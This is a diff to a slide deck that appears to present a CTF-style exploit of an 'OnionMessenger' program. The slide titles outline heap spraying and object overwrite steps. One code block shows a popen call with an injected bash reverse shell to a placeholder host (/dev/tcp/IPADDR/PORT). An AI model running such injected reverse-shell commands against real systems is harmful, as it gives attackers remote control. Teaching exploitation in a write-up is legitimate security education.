@@ -179,23 +179,23 @@ void OnionMessenger::HandleAArt(Message::ImgLayer *msg) {
 @[](Heap spray)
 ---
 <!-- .slide: data-background-transition="none" -->
----?image=assets/image/process3.png&size=60%
+![](assets/image/process3.png)
 @[](Send a Image packet)
 ---
 <!-- .slide: data-background-transition="none" -->
----?image=assets/image/process4.png&size=60%
+![](assets/image/process4.png)
 @[](Concatination previous URL and NULL)
 ---
 <!-- .slide: data-background-transition="none" -->
----?image=assets/image/process5.png&size=60%
+![](assets/image/process5.png)
 @[](Make Cache Full. To trigger pop)
 ---
 <!-- .slide: data-background-transition="none" -->
----?image=assets/image/process6.png&size=60%
+![](assets/image/process6.png)
 @[](Overwrite string object of Element)
 ---
 <!-- .slide: data-background-transition="none" -->
----?image=assets/image/process3.png&size=60%
+![](assets/image/process3.png)
 @[](Trigger GetPath)
 <!-- .slide: data-background-transition="none" -->
 
@@ -241,7 +241,7 @@ string Asciiart(const char *filepath) {
 
 ```C++
 popen("/root/bin/goasciiart –p \
-    ;echo \"bash -i >& /dev/tcp/IPADDR/8080 0>&1\"  | bash;\
+    ;echo \"bash -i >& /dev/tcp/IPADDR/PORT 0>&1\"  | bash;\
     –w 80");
 ```
 
